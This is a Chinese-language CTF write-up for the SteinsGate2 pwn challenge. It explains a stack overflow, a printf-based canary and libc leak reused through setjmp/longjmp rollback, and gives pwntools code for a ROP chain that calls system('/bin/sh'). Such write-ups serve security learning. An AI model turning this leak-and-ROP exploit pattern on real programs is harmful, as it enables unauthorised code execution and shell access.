# SteinsGate2

## 题目简述

程序是带状态机的 64 位菜单题，开启了栈 canary。`event_ibn5100` 中存在对 80 字节缓冲区使用无长度限制 `%s` 的栈溢出，但进入该分支前必须满足世界线状态条件；`event_hacking` 中可利用 `printf` 对未终止字符串的输出泄露栈上数据。程序还通过 `setjmp`/`longjmp` 实现“D-mail”回滚，使只能使用一次的泄露功能能够被重复利用。

## 解题过程

首先输入固定的世界线变动率 `0.898834229`，使 `save.know_truth` 为真并进入可触发 `event_ibn5100` 的状态。最终溢出点可概括为：

```c
char msg[80];
scanf("%s", msg);
```

泄露函数把用户数据放进 `cmd[0x100]`，随后将它作为脚本输出参数交给 `printf`。输入不含 `\x00` 的填充后，输出会越过缓冲区继续打印栈内容。

第一次发送 `0x39` 个非零字节，回显后读取 7 字节，并在前面补 canary 固定的空字节：

```python
canary = u64(b"\x00" + io.recvn(7))
```

随后触发 D-mail。程序中的宏本质上是：

```c
#define SETDMAIL() setjmp(sp[save.days - 1])
#define STARTDMAIL(x) longjmp(sp[x - 1], x)
```

回滚后 `event_hacking` 又处于未使用状态。第二次用 `0x18` 字节填充泄露一个 libc 指针，官方环境中该指针相对 libc 基址的偏移为 `0x662e2`：

```python
libc_base = u64(io.recvn(6).ljust(8, b"\x00")) - 0x662E2
```

准备进入 `event_ibn5100` 后，溢出到 canary 的距离为 `0x58`。恢复正确 canary、覆盖保存的 `rbp`，再用 libc 中的 gadget 设置 `rdi` 为 `/bin/sh` 地址并调用 `system`。官方环境使用了带额外 `pop rbp` 的 gadget，因此连续放两个 `/bin/sh` 地址：

```python
libc = ELF("./libc.so.6", checksec=False)
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
pop_rdi_rbp = libc_base + 0x276E9
system = libc_base + libc.sym["system"]

payload = b"A" * 0x58
payload += p64(canary)
payload += b"B" * 8
payload += p64(pop_rdi_rbp)
payload += p64(bin_sh)
payload += p64(bin_sh)
payload += p64(system)
```

发送 payload 前应确保当前状态仍满足进入 IBN5100 分支的条件。若调用 `system` 时崩溃，在 gadget 链中增加单独的 `ret` 以恢复 16 字节栈对齐。

## 方法总结

本题不是单纯的 canary 绕过：状态机和 `setjmp`/`longjmp` 决定了泄露原语能否复用。处理这类题时，应分别记录“进入漏洞分支的状态条件”“泄露后如何回到旧状态”“每次泄露得到什么”以及“最终覆盖布局”。canary 首字节为零、libc 泄露偏移和 ROP 栈对齐都是必须单独验证的环节。
